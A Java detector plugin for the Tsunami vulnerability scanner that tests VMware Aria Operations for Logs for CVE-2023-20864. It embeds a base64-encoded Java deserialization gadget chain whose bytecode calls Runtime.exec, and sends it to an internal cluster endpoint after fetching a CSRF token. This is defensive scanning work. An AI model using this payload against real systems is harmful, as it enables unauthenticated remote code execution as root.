/*
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.COOKIE;
import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
import static org.apache.http.HttpHeaders.USER_AGENT;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.io.BaseEncoding;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.*;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.inject.Inject;

/** A VulnDetector plugin to for CVE-2023-20864. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "vmware aira operations for logs RCE CVE-2023-20864 Detector",
    version = "0.1",
    description =
        "Detects vmware aira operations for logs that are vulnerable to authentication RCE.",
    author = "SuperX (SuperX.SIR@proton.me)",
    bootstrapModule = vmwareairaoperationsforlogsRceDetectorBootstrapModule.class)
public final class vmwareairaoperationsforlogsVulnDetector implements VulnDetector {
  @VisibleForTesting
  static final String DETECTION_STRING =
      "{\"errorMessage\":\"Internal error occurred during request processing.\"}";

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final String CSRF_PATH = "csrf";
  private static final String VUL_PATH = "api/v2/internal/cluster/applyMembership";
  private static final String POST_DATA =
      "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhc"
          + "mF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbX"
          + "BhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5"
          + "zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlL"
          + "nhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2x"
          + "ldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0c"
          + "HV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAAAAAAAdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAlt"
          + "CrPMX+AYIVOACAAB4cAAAAvTK/rq+AAAAMQAmAQANVDEyNTcwOTc0NjI4MgcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAApTb3VyY"
          + "2VGaWxlAQASVDEyNTcwOTc0NjI4Mi5qYXZhAQAIPGNsaW5pdD4BAAMoKVYBAARDb2RlAQARamF2YS9sYW5nL1J1bnRpbWUHAAoBAAp"
          + "nZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAMAA0KAAsADgEAEGphdmEvbGFuZy9TdHJpbmcHABABAAY8aW5pdD4BA"
          + "AUoW0IpVgwAEgATCgARABQBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAWABcKAAsAGAE"
          + "ADVN0YWNrTWFwVGFibGUBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyY"
          + "W5zbGV0BwAbAQAUamF2YS9pby9TZXJpYWxpemFibGUHAB0BABBzZXJpYWxWZXJzaW9uVUlEAQABSgWtIJPzkd3vPgEADUNvbnN0YW5"
          + "0VmFsdWUMABIACAoAHAAkACEAAgAcAAEAHgABABoAHwAgAAEAIwAAAAIAIQACAAgABwAIAAEACQAAANYACAACAAAAwacAAwFMuAAPu"
          + "wARWRAZvAhZAxB0kVRZBBBvkVRZBRB1kVRZBhBjkVRZBxBokVRZCBAgkVRZEAYQL5FUWRAHEHSRVFkQCBBtkVRZEAkQcJFUWRAKEC+"
          + "RVFkQCxBDkVRZEAwQVpFUWRANEEWRVFkQDhAtkVRZEA8QMpFUWRAQEDCRVFkQERAykVRZEBIQM5FUWRATEC2RVFkQFBAykVRZEBUQM"
          + "JFUWRAWEDiRVFkQFxA2kVRZEBgQNJFUtwAVtgAZV7EAAAABABoAAAADAAEDAAEAEgAIAAEACQAAABEAAQABAAAABSq3ACWxAAAAAAA"
          + "BAAUAAAACAAZ1cQB+ABAAAADyyv66vgAAADEAEwEAA0ZvbwcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAApTb3VyY2VGaWxlAQAIR"
          + "m9vLmphdmEBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQcABwEAEHNlcmlhbFZlcnNpb25VSUQBAAFKBXHmae48bUcYAQANQ29uc3RhbnR"
          + "WYWx1ZQEABjxpbml0PgEAAygpVgwADgAPCgAEABABAARDb2RlACEAAgAEAAEACAABABoACQAKAAEADQAAAAIACwABAAEADgAPAAEAE"
          + "gAAABEAAQABAAAABSq3ABGxAAAAAAABAAUAAAACAAZwdAABUHB3AQB4cQB+AA14";
  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;

  @Inject
  vmwareairaoperationsforlogsVulnDetector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  private static StringBuilder buildTarget(NetworkService networkService) {
    StringBuilder targetUrlBuilder = new StringBuilder();
    if (NetworkServiceUtils.isWebService(networkService)) {
      targetUrlBuilder.append(NetworkServiceUtils.buildWebApplicationRootUrl(networkService));
    } else {
      targetUrlBuilder
          .append("https://")
          .append(toUriAuthority(networkService.getNetworkEndpoint()))
          .append("/");
    }
    return targetUrlBuilder;
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2023-20864 (vmware aira operation for logs RCE) starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetcsrfUrl = buildTarget(networkService).append(CSRF_PATH).toString();
    String targetvulPathUrl = buildTarget(networkService).append(VUL_PATH).toString();

    byte[] payload = BaseEncoding.base64().decode(POST_DATA);

    try {
      logger.atInfo().log("Attempting to get a session");

      HttpResponse httpcsrfResponse =
          this.httpClient.send(
              HttpRequest.get(targetcsrfUrl)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader("User-Agent", "TSUNAMI_SCANNER")
                          .addHeader("X-Csrf-Token", "Fetch")
                          .build())
                  .build());
      ImmutableList<String> CookieHeaders = httpcsrfResponse.headers().getAll("Set-Cookie");
      String requestCookie = "";

      for (String CookieHeader : CookieHeaders) {

        Matcher jsessionIdMatcher =
            Pattern.compile("JSESSIONID=[a-zA-Z0-9.]+;", Pattern.CASE_INSENSITIVE)
                .matcher(CookieHeader);
        if (jsessionIdMatcher.find()) {
          requestCookie = requestCookie + jsessionIdMatcher.group();
        }

        Matcher csMatcher =
            Pattern.compile("cs=[a-zA-Z0-9.]+;", Pattern.CASE_INSENSITIVE).matcher(CookieHeader);

        if (csMatcher.find()) {
          requestCookie = requestCookie + csMatcher.group();
        }
      }

      String xcsrfToken = String.valueOf(httpcsrfResponse.headers().get("X-CSRF-Token").get());

      logger.atInfo().log(
          "Response get csrf: %s, GET X-CSRF-Token: %s, GET Cookie: %s",
          httpcsrfResponse.bodyString().get(), xcsrfToken, requestCookie);

      logger.atInfo().log("Attempting to request deserialize interface");
      HttpResponse httpResponse =
          httpClient.send(
              HttpRequest.post(targetvulPathUrl)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader("X-CSRF-Token", xcsrfToken, false)
                          .addHeader(USER_AGENT, "TSUNAMI_SCANNER")
                          .addHeader(COOKIE, requestCookie)
                          .build())
                  .setRequestBody(ByteString.copyFrom(payload))
                  .build(),
              networkService);
      logger.atInfo().log(
          "Response request deserialize interface: %s", httpResponse.bodyString().get());
      if (httpResponse.status().code() != 404
          && httpResponse.status().code() != 200
          && httpResponse.bodyString().get().contains(DETECTION_STRING)) {
        return true;
      }

    } catch (IOException | AssertionError e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
      return false;
    }

    return false;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE-2023-20864"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("vmware aira operations for logs RCE")
                .setDescription(
                    "VMware Aria Operations for Logs contains a deserialization vulnerability. An unauthenticated, "
                        + "malicious actor with network access to VMware Aria Operations for Logs may be able to"
                        + " execute arbitrary code as root.\n"
                        + "The affected version is 8.10.2, it is recommended to upgrade to 8.12")
                .setRecommendation(
                    "Update to versions that are at least 8.12.0 or any later" + " version."))
        .build();
  }
}
